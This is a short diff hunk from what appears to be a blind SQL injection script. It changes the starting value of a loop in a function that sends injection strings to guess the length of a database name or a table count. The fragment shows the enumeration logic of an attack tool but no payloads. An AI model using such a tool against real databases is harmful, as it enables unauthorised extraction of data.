@@ -25,7 +25,7 @@ def sql_inject(sqli_pt1, variable, sqli_pt2):
 
 def guess_len(guess_type, sqli_pt1, sqli_pt2):
     # Guess length of DB name, table count etc
-    for i in range(0, 100):
+    for i in range(1, 100):
         # Submit SQLi string
         response = sql_inject(sqli_pt1, str(i), sqli_pt2)
         # Extract the response we're interested in
